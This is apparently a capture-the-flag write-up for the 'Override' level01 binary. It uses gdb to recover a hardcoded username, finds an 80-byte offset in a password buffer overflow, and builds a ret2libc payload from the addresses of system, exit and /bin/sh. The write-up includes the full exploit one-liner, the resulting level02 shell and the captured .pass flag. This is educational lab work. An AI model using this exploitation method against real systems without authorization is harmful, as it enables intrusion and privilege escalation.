# Override - level01

We've started executing the binary to see what was asking.

It asked a username and if we gave a wrong one the output was "nope, incorrect username...".

When we su from level00 we noticed that the no execute (NX) bit was't set, so the program's Stack is probably vulnerable to a buffer overflow.

We tried to make the username input overflow without success.

We analyzed the binary using gdb

```
info functions
```

we noticed that there were two functions named
    - verify_user_name
    - verify_user_pass

dissassembling the first one we've noticed that there was a comparison between esi and edi.

The comparison repeated till [esi] and [edi] were equal

```
Dump of assembler code for function verify_user_name:
...
0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]    <- repeated comparison
...
0x080484a2 <+62>:	ret
```

Using gdb we set a breakpoint on the comparison

```
b *0x0804848b
```

and we printed the values of esi and edi

```
(gdb) x/s $edi
0x80486a8:	 "dat_wil"
(gdb) x/s $esi
0x804a040 <a_user_name>:	 "ciao\n"
```

the comparison was between "dat_wil" (fixed value) and our input "ciao".
So dat_wil is the username. Effectively it worked and asked for the password.

We tried to make the password input overflow 

The problem is that there is no call to system in main, if we have the username
and the password it will only return 1 or 0 and nothing will happen.

Since using the checksec command we can see that the no excution (NX) byte is not set we can try a classic buffer overflow attack.

Testing we noticed that if we sent 100 chars to the password input we have a buffer overflow, so it's probably exploitable.

At first we need to find right number of chars to send to have a buffer overflow, we used for this purpose a buffer overflow pattern generator with gdb.

We run the program in gdb and gave as password a 200 char pattern

```
Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9A         f nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

using the address of the segv we got that the offset is 80.

Now we can find the addresses of system, exit and /bin/sh in the libc

```
info functions system
0xf7e6aed0  system

info functions exit
0xf7e5eb70  exit
```

to find /bin/sh we need to print the list of mapped memory regions.

```
info proc map

0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
```

in the libc we search for "/bin/sh" using find

```
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.

(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```
Now we can build the payload for the exploit.

We convert the addresses to little endian

```
system      0xf7e6aed0  <==>    \xd0\xae\xe6\xf7
exit        0xf7e5eb70  <==>    \x70\xeb\xe5\xf7
"/bin/sh"   0xf7f897ec  <==>    \xec\x97\xf8\xf7
```

We store the shellcode into a tmp file since we have to open a shell using cat.

```
python -c "print 'dat_wil'; print 'A' * 80 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'" > /tmp/level01

cat /tmp/level01 - | ./level01

level02 shell is open

whoami
level02

cat ~level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```